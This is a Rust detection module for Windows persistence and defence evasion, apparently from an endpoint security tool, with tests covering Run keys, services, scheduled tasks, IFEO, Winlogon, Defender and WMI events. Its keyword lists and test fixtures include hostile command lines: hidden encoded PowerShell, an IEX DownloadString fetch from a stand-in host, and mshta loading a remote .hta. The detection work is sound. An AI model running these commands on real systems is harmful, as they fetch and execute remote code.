//! Persistence rules over registry changes (`class=registry`) and the Windows
//! service / scheduled-task creation events (System 7045, Security 4697 and
//! 4698). Lives apart from `windows_rules` (process-start rules) because the
//! inputs are different events.
//!
//! Platform-neutral so recorded telemetry replays on any build.
//!
//! Tiering mirrors the process rules: an unambiguous attacker form (encoded
//! or download-and-run command, IFEO debugger, Winlogon shell swap, AppInit
//! DLL, Defender switched off) alerts; forms that legitimate installers also
//! produce (a Run value or service in a user-writable path) start in shadow
//! mode; a plain new autorun/service/task is a signal that only adds context
//! to a chain. Deleted values never fire: cleanup is not persistence.

use super::windows_rules::{eventlog_source, is_user_writable};
use trapd_schema::{DetectionData, LogEventData, RegistryEventData};

/// What a command line / image path looks like.
#[derive(Default, Debug, PartialEq, Eq)]
struct Traits {
    user_writable: bool,
    script_host: bool,
    encoded: bool,
    download: bool,
    hidden: bool,
}

impl Traits {
    /// Forms with no benign installer explanation.
    fn strong(&self) -> bool {
        self.encoded || self.download
    }
    /// Forms installers also produce; shadow-mode material.
    fn weak(&self) -> bool {
        self.user_writable || self.script_host || self.hidden
    }
}

/// Expand the common environment references so user-writable detection works
/// on `REG_EXPAND_SZ` data that has not been expanded.
fn expand_hint(lower: &str) -> String {
    lower
        .replace('/', "\\")
        .replace("%localappdata%", "c:\\users\\x\\appdata\\local")
        .replace("%appdata%", "c:\\users\\x\\appdata\\roaming")
        .replace("%temp%", "c:\\users\\x\\appdata\\local\\temp")
        .replace("%tmp%", "c:\\users\\x\\appdata\\local\\temp")
        .replace("%public%", "c:\\users\\public")
        .replace("%programdata%", "c:\\programdata")
}

fn traits(cmd: &str) -> Traits {
    let lower = cmd.to_ascii_lowercase();
    let path = expand_hint(&lower);
    let has = |needles: &[&str]| needles.iter().any(|n| lower.contains(n));
    let words: Vec<&str> = lower.split_whitespace().collect();
    let encoded_flag = words.windows(2).any(|w| {
        let flag = w[0].trim_start_matches(['-', '/']);
        let is_enc = flag == "ec" || (!flag.is_empty() && "encodedcommand".starts_with(flag));
        is_enc
            && w[1].len() >= 20
            && w[1]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
    });
    let trimmed = path.trim_start_matches(['"', ' ']);
    // `\\?\` and `\\.\` are local device namespaces, not network shares.
    let unc = trimmed.starts_with("\\\\")
        && !trimmed.starts_with("\\\\?\\")
        && !trimmed.starts_with("\\\\.\\");
    Traits {
        user_writable: is_user_writable(&path),
        script_host: has(&[
            "powershell",
            "pwsh",
            "cmd.exe",
            "cmd /c",
            "cmd /k",
            "wscript",
            "cscript",
            "mshta",
            "rundll32",
            "regsvr32",
            "bitsadmin",
            "certutil",
            "wmic",
            "curl ",
        ]),
        encoded: encoded_flag || has(&["frombase64string"]),
        download: unc
            || has(&[
                "http://",
                "https://",
                "ftp://",
                "downloadstring",
                "downloadfile",
                "invoke-webrequest",
                "invoke-expression",
                "iex ",
                "iex(",
            ]),
        hidden: has(&["-w hidden", "-windowstyle hidden", "-win hidden", " -nop"]),
    }
}

#[allow(clippy::too_many_arguments)]
fn detection(
    rule_id: &str,
    title: &str,
    category: &str,
    tactic: &str,
    technique: &str,
    confidence: u8,
    subject: String,
    detail: String,
    evidence: serde_json::Value,
) -> DetectionData {
    DetectionData {
        rule_id: rule_id.into(),
        title: title.into(),
        category: category.into(),
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence,
        subject,
        detail,
        evidence,
        ..Default::default()
    }
}

const PERSIST: &str = "TA0003 Persistence";
const EVASION: &str = "TA0005 Defense Evasion";

fn registry_evidence(r: &RegistryEventData) -> serde_json::Value {
    serde_json::json!({
        "key_path": r.key_path,
        "value_name": r.value_name,
        "old_value": r.old_value,
        "new_value": r.new_value,
        "user_sid": r.user_sid,
        "cmdline": r.new_value,
        "source": "registry",
    })
}

fn last_segment(path: &str) -> &str {
    path.rsplit('\\').next().unwrap_or(path)
}

/// `...\Services\<name>[\Parameters]` -> `<name>`.
fn service_name_of(key_path: &str) -> &str {
    let mut parts = key_path.rsplit('\\');
    let last = parts.next().unwrap_or("");
    if last.eq_ignore_ascii_case("parameters") {
        parts.next().unwrap_or(last)
    } else {
        last
    }
}

/// Exactly one tiered family finding for a command: strong -> alert rule,
/// weak -> shadow rule, otherwise the context signal.
#[allow(clippy::too_many_arguments)]
fn tiered(
    ids: (&str, &str, &str),
    title: &str,
    technique: &str,
    t: &Traits,
    subject: String,
    cmd: &str,
    evidence: serde_json::Value,
) -> DetectionData {
    let (signal, weak, strong) = ids;
    let (rule, confidence, label) = if t.strong() {
        (strong, 85, "suspicious command")
    } else if t.weak() {
        (weak, 55, "script host or user-writable location")
    } else {
        (signal, 30, "new entry")
    };
    detection(
        rule,
        title,
        "persistence",
        PERSIST,
        technique,
        confidence,
        subject,
        format!("{title} ({label}): {cmd}"),
        evidence,
    )
}

/// Inspect one registry change. Deletions never fire.
pub fn inspect_registry(r: &RegistryEventData) -> Vec<DetectionData> {
    if let Some(source) = &r.rename_from {
        // The collector classified the rename against its watch table (see
        // `windows_native`): the category is the watched one or the generic
        // native marker, so detection needs no knowledge of the table.
        if matches!(r.category.as_str(), "" | "native_registry" | "storm") {
            return Vec::new();
        }
        let category = r.category.as_str();
        let subject = if source.value_name.is_some() {
            format!("{}\\{}", r.key_path, r.value_name)
        } else {
            r.key_path.clone()
        };
        let mut finding = detection(
            "persistence.registry_object_renamed", "Registry object renamed at a watched location",
            "persistence", EVASION, "T1112", 60, subject,
            "A registry object name changed at a watched location; value data is unavailable and this observation alone does not establish malicious persistence.".into(),
            serde_json::json!({"key_path":r.key_path,"value_name":r.value_name,"rename_from":source,
                "category":category,"old_value":null,"new_value":null,"value_data_available":false}),
        );
        finding.mode = Some(trapd_schema::DetectionMode::Signal);
        return vec![finding];
    }
    let Some(new) = r.new_value.as_deref() else {
        return Vec::new();
    };
    let value = r.value_name.to_ascii_lowercase();
    let ev = registry_evidence(r);
    let shown = format!("{}\\{}", r.key_path, r.value_name);
    let mut out = Vec::new();

    match r.category.as_str() {
        "run_key" => {
            out.push(tiered(
                (
                    "persistence.registry_run_key_added",
                    "persistence.registry_run_userpath",
                    "persistence.registry_run_suspicious",
                ),
                "Autorun registry value added",
                "T1547.001",
                &traits(new),
                shown,
                new,
                ev,
            ));
        }
        "startup_env" if !new.trim().is_empty() => {
            out.push(tiered(
                (
                    "persistence.registry_run_key_added",
                    "persistence.registry_run_userpath",
                    "persistence.registry_run_suspicious",
                ),
                "Logon script registry value set",
                "T1037.001",
                &traits(new),
                shown,
                new,
                ev,
            ));
        }
        "service" if value == "imagepath" || value == "servicedll" => {
            let name = service_name_of(&r.key_path);
            out.push(tiered(
                (
                    "persistence.service_installed",
                    "persistence.service_image_userpath",
                    "persistence.service_image_suspicious",
                ),
                "Service image registered",
                "T1543.003",
                &traits(new),
                format!("service:{name}"),
                new,
                ev,
            ));
        }
        "scheduled_task" if value == "id" => {
            let name = last_segment(&r.key_path);
            out.push(detection(
                "persistence.scheduled_task_created",
                "Scheduled task registered",
                "persistence",
                PERSIST,
                "T1053.005",
                30,
                format!("task:{name}"),
                format!("Scheduled task registered: {name}"),
                ev,
            ));
        }
        "ifeo" => {
            let silent_exit_flag = value == "globalflag"
                && new
                    .trim()
                    .parse::<u64>()
                    .map(|f| f & 0x200 != 0)
                    .unwrap_or(false);
            let hit = match value.as_str() {
                // Visual Studio's just-in-time debugger is the one routine user.
                "debugger" => {
                    !new.trim().is_empty() && !new.to_ascii_lowercase().contains("vsjitdebugger")
                }
                "monitorprocess" | "verifierdlls" => !new.trim().is_empty(),
                "globalflag" => silent_exit_flag,
                _ => false,
            };
            if hit {
                let target = last_segment(&r.key_path).to_ascii_lowercase();
                let accessibility = [
                    "sethc.exe",
                    "utilman.exe",
                    "osk.exe",
                    "narrator.exe",
                    "magnify.exe",
                    "displayswitch.exe",
                    "atbroker.exe",
                ]
                .contains(&target.as_str());
                out.push(detection(
                    "persistence.ifeo_debugger",
                    "Image File Execution Options hijack",
                    "persistence",
                    PERSIST,
                    "T1546.012",
                    if accessibility { 95 } else { 85 },
                    shown,
                    format!(
                        "IFEO {} set on {}: {new}",
                        r.value_name,
                        last_segment(&r.key_path)
                    ),
                    ev,
                ));
            }
        }
        "winlogon" => {
            let n = new.trim().to_ascii_lowercase();
            let suspicious = match value.as_str() {
                "shell" => !n.is_empty() && n != "explorer.exe",
                "userinit" => {
                    let mut parts = n.split(',').map(str::trim).filter(|p| !p.is_empty());
                    let first = parts.next().unwrap_or("");
                    let default = is_default_userinit(first);
                    !default || parts.next().is_some()
                }
                "taskman" => !n.is_empty(),
                _ => false,
            };
            if suspicious {
                out.push(detection(
                    "persistence.winlogon_modified",
                    "Winlogon shell or userinit modified",
                    "persistence",
                    PERSIST,
                    "T1547.004",
                    90,
                    shown,
                    format!("Winlogon {} changed to: {new}", r.value_name),
                    ev,
                ));
            }
        }
        "appinit" if value == "appinit_dlls" && !new.trim().is_empty() => {
            let t = traits(new);
            out.push(detection(
                "persistence.appinit_dlls",
                "AppInit_DLLs configured",
                "persistence",
                PERSIST,
                "T1546.010",
                if t.user_writable { 95 } else { 85 },
                shown,
                format!("AppInit_DLLs now loads into every GUI process: {new}"),
                ev,
            ));
        }
        "defender" => {
            let key = r.key_path.to_ascii_lowercase();
            if key.contains("\\exclusions\\") {
                let item = r.value_name.as_str();
                let lower = item.to_ascii_lowercase();
                let t = traits(item);
                let drive_root = {
                    let l = lower.trim_end_matches('\\');
                    l.len() == 2 && l.ends_with(':')
                };
                let risky_ext = ["exe", "dll", "ps1", "bat", "cmd", "js", "vbs", "scr"]
                    .contains(&lower.trim_start_matches('.'));
                let shell_proc = ["powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe"]
                    .contains(&lower.as_str());
                let confidence = if t.user_writable || drive_root || risky_ext || shell_proc {
                    85
                } else {
                    60
                };
                out.push(detection(
                    "defense_evasion.defender_exclusion",
                    "Microsoft Defender exclusion added",
                    "defense_evasion",
                    EVASION,
                    "T1562.001",
                    confidence,
                    shown,
                    format!("Defender no longer scans: {item}"),
                    ev,
                ));
            } else if value.starts_with("disable") && new.trim() == "1" {
                out.push(detection(
                    "defense_evasion.defender_disabled",
                    "Microsoft Defender disabled by policy",
                    "defense_evasion",
                    EVASION,
                    "T1562.001",
                    90,
                    shown,
                    format!("{} set to 1", r.value_name),
                    ev,
                ));
            }
        }
        "com_hijack" if !new.trim().is_empty() => {
            let t = traits(new);
            out.push(detection(
                "persistence.com_hijack",
                "Per-user COM server registered",
                "persistence",
                PERSIST,
                "T1546.015",
                if t.user_writable { 80 } else { 55 },
                shown,
                format!("{} -> {new}", r.key_path),
                ev,
            ));
        }
        _ => {}
    }
    out
}

fn field<'a>(fields: &'a serde_json::Map<String, serde_json::Value>, name: &str) -> &'a str {
    fields.get(name).and_then(|v| v.as_str()).unwrap_or("")
}

fn between<'a>(xml: &'a str, tag: &str) -> Option<&'a str> {
    let open = format!("<{tag}>");
    let start = xml.find(&open)? + open.len();
    let end = xml[start..].find(&format!("</{tag}>"))? + start;
    Some(&xml[start..end])
}

fn unescape(s: &str) -> String {
    s.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&amp;", "&")
}

/// Windows event-log records that create persistence: System 7045 / Security
/// 4697 (service installed) and Security 4698 (scheduled task created; needs
/// the "Other Object Access Events" audit policy to be logged at all).
pub fn inspect_eventlog(log: &LogEventData) -> Vec<DetectionData> {
    let fields = &log.fields;
    let id = fields.get("EventID").and_then(|v| v.as_u64()).unwrap_or(0);
    if eventlog_source(log).is_none() {
        return Vec::new();
    }
    match id {
        7045 | 4697 => {
            let name = field(fields, "ServiceName");
            let image = if id == 7045 {
                field(fields, "ImagePath")
            } else {
                field(fields, "ServiceFileName")
            };
            if name.is_empty() && image.is_empty() {
                return Vec::new();
            }
            let mut t = traits(image);
            let kernel = field(fields, "ServiceType")
                .to_ascii_lowercase()
                .contains("kernel");
            if kernel && t.user_writable {
                t.encoded = true; // a driver loaded from a user path is never routine
            }
            let ev = serde_json::json!({
                "event_id": id,
                "service_name": name,
                "image_path": image,
                "service_type": field(fields, "ServiceType"),
                "start_type": field(fields, "StartType"),
                "account": field(fields, "AccountName"),
                "cmdline": image,
                "source": "eventlog",
            });
            vec![tiered(
                (
                    "persistence.service_installed",
                    "persistence.service_image_userpath",
                    "persistence.service_image_suspicious",
                ),
                "New service installed",
                "T1543.003",
                &t,
                format!("service:{name}"),
                image,
                ev,
            )]
        }
        4698 => {
            let name = field(fields, "TaskName").trim_start_matches('\\');
            let content = field(fields, "TaskContent");
            let command = between(content, "Command")
                .map(unescape)
                .unwrap_or_default();
            let args = between(content, "Arguments")
                .map(unescape)
                .unwrap_or_default();
            let cmd = format!("{command} {args}").trim().to_string();
            let ev = serde_json::json!({
                "event_id": id,
                "task_name": name,
                "command": command,
                "arguments": args,
                "created_by": field(fields, "SubjectUserName"),
                "cmdline": cmd,
                "source": "eventlog",
            });
            vec![tiered(
                (
                    "persistence.scheduled_task_created",
                    "persistence.scheduled_task_userpath",
                    "persistence.scheduled_task_suspicious",
                ),
                "Scheduled task created",
                "T1053.005",
                &traits(&cmd),
                format!("task:{name}"),
                &cmd,
                ev,
            )]
        }
        // Permanent WMI event subscription registered (filter + consumer
        // binding): a classic fileless persistence mechanism. Only the
        // consumer types that run code are rated as an alert.
        5861 => {
            const CAP: usize = 1024;
            let cap = |s: &str| s.chars().take(CAP).collect::<String>();
            let consumer = cap(field(fields, "CONSUMER"));
            let cause = cap(field(fields, "PossibleCause"));
            if consumer.is_empty() && cause.is_empty() {
                return Vec::new();
            }
            let lower = format!("{consumer} {cause}").to_ascii_lowercase();
            let runs_code = lower.contains("commandlineeventconsumer")
                || lower.contains("activescripteventconsumer");
            let (rule, confidence) = if runs_code {
                ("persistence.wmi_command_consumer", 85)
            } else {
                ("persistence.wmi_subscription", 55)
            };
            vec![DetectionData {
                rule_id: rule.into(),
                title: "WMI permanent event subscription registered".into(),
                category: "persistence".into(),
                mitre_tactic: Some("TA0003 Persistence".into()),
                mitre_technique: Some("T1546.003".into()),
                confidence,
                subject: format!(
                    "wmi:{}",
                    if consumer.is_empty() {
                        &cause
                    } else {
                        &consumer
                    }
                ),
                detail: format!("A permanent WMI subscription was registered: {consumer}"),
                evidence: serde_json::json!({
                    "event_id": id,
                    "namespace": cap(field(fields, "Namespace")),
                    "consumer": consumer,
                    "possible_cause": cause,
                    "source": "eventlog",
                }),
                ..Default::default()
            }]
        }
        _ => Vec::new(),
    }
}

/// The stock `Userinit` program: bare name, `%SystemRoot%` spelling, or the
/// host's actual system root (not necessarily `C:\\Windows`). `first` is
/// lower-cased.
fn is_default_userinit(first: &str) -> bool {
    let first = first.replace('\\', "/");
    first == "userinit.exe"
        || first == "%systemroot%/system32/userinit.exe"
        || crate::windows_roots::install_roots()
            .windows
            .iter()
            .any(|w| first == format!("{w}system32/userinit.exe"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn change(category: &str, key: &str, name: &str, new: Option<&str>) -> RegistryEventData {
        RegistryEventData {
            key_path: key.into(),
            value_name: name.into(),
            category: category.into(),
            user_sid: Some("S-1-5-21-1-2-3-1001".into()),
            old_value: None,
            new_value: new.map(str::to_string),
            rename_from: None,
            suppressed: None,
        }
    }

    fn ids(d: &[DetectionData]) -> Vec<&str> {
        d.iter().map(|d| d.rule_id.as_str()).collect()
    }

    const RUN: &str = r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run";

    #[test]
    fn renames_in_watched_categories_are_signals_without_content_dependent_findings() {
        for (category, key, name) in [
            ("run_key", RUN, "Renamed"),
            (
                "service",
                r"HKLM\SYSTEM\CurrentControlSet\Services\demo",
                "ImagePath",
            ),
            (
                "ifeo",
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe",
                "Debugger",
            ),
            (
                "winlogon",
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                "Shell",
            ),
            (
                "appinit",
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                "AppInit_DLLs",
            ),
            (
                "defender",
                r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
                "DisableAntiSpyware",
            ),
            (
                "com_hijack",
                r"HKU\S-1-5-21-1-2-3-1001_Classes\CLSID\{test}\InprocServer32",
                "(Default)",
            ),
            (
                "scheduled_task",
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\demo",
                "Id",
            ),
            (
                "startup_env",
                r"HKU\S-1-5-21-1-2-3-1001\Environment",
                "UserInitMprLogonScript",
            ),
        ] {
            let mut record = change(category, key, name, None);
            record.rename_from = Some(trapd_schema::RegistryRenameSource {
                key_path: key.into(),
                value_name: Some("Previous".into()),
            });
            let findings = inspect_registry(&record);
            assert_eq!(ids(&findings), ["persistence.registry_object_renamed"]);
            assert_eq!(findings[0].mode, Some(trapd_schema::DetectionMode::Signal));
            assert_eq!(
                findings[0].evidence["rename_from"]["value_name"],
                "Previous"
            );
            assert!(findings[0].evidence["new_value"].is_null());
        }
    }

    #[test]
    fn plain_run_value_is_a_context_signal() {
        // `reg add HKCU\...\Run /v trapdtest /d "cmd /c echo x"` style value
        // without script host: still yields a detection (signal).
        let d = inspect_registry(&change(
            "run_key",
            RUN,
            "trapdtest",
            Some(r"C:\Program Files\App\app.exe /background"),
        ));
        assert_eq!(ids(&d), ["persistence.registry_run_key_added"]);
        assert_eq!(d[0].subject, format!("{RUN}\\trapdtest"));
    }

    #[test]
    fn run_value_in_user_path_or_script_host_is_weak() {
        for cmd in [
            r"C:\Users\u\AppData\Roaming\x\upd.exe",
            r"%APPDATA%\x\upd.exe",
            r"%TEMP%\a.exe",
            "cmd /c echo x",
            r"C:\Windows\System32\wscript.exe C:\ProgramData\a.vbs",
        ] {
            let d = inspect_registry(&change("run_key", RUN, "v", Some(cmd)));
            assert_eq!(ids(&d), ["persistence.registry_run_userpath"], "{cmd}");
        }
    }

    #[test]
    fn run_value_with_encoded_or_download_is_strong() {
        let b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=";
        for cmd in [
            format!("powershell.exe -nop -w hidden -enc {b64}"),
            "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://x/a')\"".into(),
            r"\\evil\share\a.exe".into(),
            "mshta https://x/a.hta".into(),
        ] {
            let d = inspect_registry(&change("run_key", RUN, "v", Some(&cmd)));
            assert_eq!(ids(&d), ["persistence.registry_run_suspicious"], "{cmd}");
        }
    }

    #[test]
    fn deletions_and_unwatched_categories_are_quiet() {
        assert!(inspect_registry(&change("run_key", RUN, "v", None)).is_empty());
        assert!(inspect_registry(&change("storm", "", "", Some("service"))).is_empty());
    }

    #[test]
    fn service_registry_rules_and_naming() {
        let key = r"HKLM\SYSTEM\CurrentControlSet\Services\evil";
        let d = inspect_registry(&change(
            "service",
            key,
            "ImagePath",
            Some(r"C:\Users\Public\a.exe"),
        ));
        assert_eq!(ids(&d), ["persistence.service_image_userpath"]);
        assert_eq!(d[0].subject, "service:evil");
        let d = inspect_registry(&change(
            "service",
            &format!("{key}\\Parameters"),
            "ServiceDll",
            Some(r"C:\Windows\System32\ok.dll"),
        ));
        assert_eq!(ids(&d), ["persistence.service_installed"]);
        assert_eq!(d[0].subject, "service:evil");
        // Start-type or account churn is not an image registration.
        assert!(inspect_registry(&change("service", key, "Start", Some("2"))).is_empty());
    }

    #[test]
    fn ifeo_debugger_alerts_with_extra_confidence_for_accessibility_tools() {
        let base =
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
        let d = inspect_registry(&change(
            "ifeo",
            &format!("{base}\\sethc.exe"),
            "Debugger",
            Some("cmd.exe"),
        ));
        assert_eq!(ids(&d), ["persistence.ifeo_debugger"]);
        assert_eq!(d[0].confidence, 95);
        let d = inspect_registry(&change(
            "ifeo",
            &format!("{base}\\app.exe"),
            "Debugger",
            Some("x.exe"),
        ));
        assert_eq!(d[0].confidence, 85);
        let d = inspect_registry(&change(
            "ifeo",
            &format!("{base}\\app.exe"),
            "GlobalFlag",
            Some("512"),
        ));
        assert_eq!(ids(&d), ["persistence.ifeo_debugger"]);
        // Benign: VS JIT debugger and unrelated GlobalFlag bits.
        assert!(inspect_registry(&change(
            "ifeo",
            &format!("{base}\\app.exe"),
            "Debugger",
            Some(r#""C:\Windows\system32\vsjitdebugger.exe" -p %ld -e %ld"#)
        ))
        .is_empty());
        assert!(inspect_registry(&change(
            "ifeo",
            &format!("{base}\\app.exe"),
            "GlobalFlag",
            Some("256")
        ))
        .is_empty());
    }

    #[test]
    fn winlogon_defaults_are_quiet_and_swaps_alert() {
        let key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        for (name, v) in [
            ("Shell", "explorer.exe"),
            ("Userinit", r"C:\Windows\system32\userinit.exe,"),
            ("Userinit", r"C:\WINDOWS\system32\userinit.exe"),
            ("Userinit", r"%SystemRoot%\system32\userinit.exe,"),
        ] {
            assert!(
                inspect_registry(&change("winlogon", key, name, Some(v))).is_empty(),
                "{name}={v}"
            );
        }
        for (name, v) in [
            ("Shell", "explorer.exe, evil.exe"),
            ("Shell", r"C:\Users\Public\sh.exe"),
            (
                "Userinit",
                r"C:\Windows\system32\userinit.exe,C:\x\evil.exe",
            ),
            ("Userinit", r"C:\x\evil.exe"),
            ("Taskman", "evil.exe"),
        ] {
            let d = inspect_registry(&change("winlogon", key, name, Some(v)));
            assert_eq!(ids(&d), ["persistence.winlogon_modified"], "{name}={v}");
        }
    }

    #[test]
    fn appinit_dlls_alert_only_when_non_empty() {
        let key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
        assert!(inspect_registry(&change("appinit", key, "AppInit_DLLs", Some(""))).is_empty());
        let d = inspect_registry(&change(
            "appinit",
            key,
            "AppInit_DLLs",
            Some(r"C:\Users\u\AppData\x.dll"),
        ));
        assert_eq!(ids(&d), ["persistence.appinit_dlls"]);
        assert_eq!(d[0].confidence, 95);
    }

    #[test]
    fn defender_exclusions_and_disable_switches() {
        let paths = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths";
        let d = inspect_registry(&change(
            "defender",
            paths,
            r"C:\Users\u\AppData\Local\Temp",
            Some("0"),
        ));
        assert_eq!(ids(&d), ["defense_evasion.defender_exclusion"]);
        assert_eq!(d[0].confidence, 85);
        let d = inspect_registry(&change("defender", paths, r"D:\Data\Backups", Some("0")));
        assert_eq!(d[0].confidence, 60);
        let d = inspect_registry(&change("defender", paths, r"C:\", Some("0")));
        assert_eq!(d[0].confidence, 85);
        let pol = r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender";
        let d = inspect_registry(&change("defender", pol, "DisableAntiSpyware", Some("1")));
        assert_eq!(ids(&d), ["defense_evasion.defender_disabled"]);
        assert!(
            inspect_registry(&change("defender", pol, "DisableAntiSpyware", Some("0"))).is_empty()
        );
    }

    #[test]
    fn com_hijack_in_user_hive() {
        let key = r"HKU\S-1-5-21-1-2-3-1001_Classes\CLSID\{abc}\InprocServer32";
        let d = inspect_registry(&change(
            "com_hijack",
            key,
            "(Default)",
            Some(r"C:\Users\u\AppData\x.dll"),
        ));
        assert_eq!(ids(&d), ["persistence.com_hijack"]);
        assert_eq!(d[0].confidence, 80);
    }

    #[test]
    fn new_scheduled_task_in_registry_is_a_signal() {
        let key =
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Updater";
        let d = inspect_registry(&change("scheduled_task", key, "Id", Some("{guid}")));
        assert_eq!(ids(&d), ["persistence.scheduled_task_created"]);
        assert_eq!(d[0].subject, "task:Updater");
    }

    fn native_log(v: serde_json::Value) -> LogEventData {
        let (channel, provider) = if v["EventID"] == 7045 {
            ("System", "Service Control Manager")
        } else if v["EventID"] == 5861 {
            (
                "Microsoft-Windows-WMI-Activity/Operational",
                "Microsoft-Windows-WMI-Activity",
            )
        } else {
            ("Security", "Microsoft-Windows-Security-Auditing")
        };
        serde_json::from_value(serde_json::json!({
            "source": format!("windows_{channel}"), "source_type": "windows_eventlog",
            "source_path": channel, "parser": "windows_eventlog_xml",
            "message": "", "category": "system", "proc": provider, "fields": v,
            "log_timestamp": "2020-09-13T12:26:40Z"
        }))
        .unwrap()
    }

    #[test]
    fn event_5861_wmi_command_consumer_is_the_alert_rule() {
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 5861, "Namespace": "//./root/subscription",
            "CONSUMER": "CommandLineEventConsumer.Name=\"upd\"",
            "PossibleCause": "Binding EventFilter: instance of __EventFilter { Name = \"upd\"; }"
        })));
        assert_eq!(ids(&d), ["persistence.wmi_command_consumer"]);
        assert!(d[0].subject.starts_with("wmi:CommandLineEventConsumer"));
    }

    #[test]
    fn event_5861_other_consumer_is_only_a_signal_and_empty_is_ignored() {
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 5861, "CONSUMER": "NTEventLogEventConsumer.Name=\"x\""
        })));
        assert_eq!(ids(&d), ["persistence.wmi_subscription"]);
        assert!(inspect_eventlog(&native_log(serde_json::json!({ "EventID": 5861 }))).is_empty());
    }

    #[test]
    fn event_5861_on_the_wrong_channel_is_not_trusted() {
        let mut log = native_log(serde_json::json!({
            "EventID": 5861, "CONSUMER": "CommandLineEventConsumer.Name=\"x\""
        }));
        log.source_path = "Application".into();
        assert!(inspect_eventlog(&log).is_empty());
    }

    #[test]
    fn event_5861_strings_are_bounded() {
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 5861, "CONSUMER": "CommandLineEventConsumer".to_string() + &"x".repeat(100_000)
        })));
        assert!(d[0].evidence["consumer"].as_str().unwrap().chars().count() <= 1024);
    }

    #[test]
    fn event_7045_new_service() {
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 7045, "ServiceName": "evil", "ImagePath": r"C:\Users\Public\a.exe",
            "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"
        })));
        assert_eq!(ids(&d), ["persistence.service_image_userpath"]);
        assert_eq!(d[0].subject, "service:evil");
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 7045, "ServiceName": "x", "ImagePath": r"C:\Users\u\AppData\d.sys",
            "ServiceType": "kernel mode driver"
        })));
        assert_eq!(ids(&d), ["persistence.service_image_suspicious"]);
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 7045, "ServiceName": "ok", "ImagePath": r"C:\Program Files\App\svc.exe"
        })));
        assert_eq!(ids(&d), ["persistence.service_installed"]);
        let d = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 4697, "ServiceName": "p", "ServiceFileName":
            "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
        })));
        assert_eq!(ids(&d), ["persistence.service_image_suspicious"]);
    }

    #[test]
    fn event_4698_scheduled_task() {
        let content = |cmd: &str, args: &str| {
            format!(
                "<Task><Actions Context=\"Author\"><Exec><Command>{cmd}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>"
            )
        };
        let mk = |c: String| {
            native_log(serde_json::json!({
                "EventID": 4698, "TaskName": "\\Updater", "TaskContent": c, "SubjectUserName": "u"
            }))
        };
        let d = inspect_eventlog(&mk(content(
            "powershell.exe",
            "-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        )));
        assert_eq!(ids(&d), ["persistence.scheduled_task_suspicious"]);
        assert_eq!(d[0].subject, "task:Updater");
        let d = inspect_eventlog(&mk(content(r"C:\Users\u\AppData\Local\a.exe", "")));
        assert_eq!(ids(&d), ["persistence.scheduled_task_userpath"]);
        let d = inspect_eventlog(&mk(content(
            r"C:\Program Files\Google\Update\GoogleUpdate.exe",
            "/ua &amp;",
        )));
        assert_eq!(ids(&d), ["persistence.scheduled_task_created"]);
        assert!(inspect_eventlog(&native_log(serde_json::json!({"EventID": 4624}))).is_empty());
    }

    #[test]
    fn registry_and_eventlog_fold_on_the_same_subject() {
        let r = inspect_registry(&change(
            "service",
            r"HKLM\SYSTEM\CurrentControlSet\Services\evil",
            "ImagePath",
            Some(r"C:\Users\Public\a.exe"),
        ));
        let e = inspect_eventlog(&native_log(serde_json::json!({
            "EventID": 7045, "ServiceName": "evil", "ImagePath": r"C:\Users\Public\a.exe"
        })));
        assert_eq!(r[0].subject, e[0].subject);
        assert_eq!(r[0].rule_id, e[0].rule_id);
    }
}
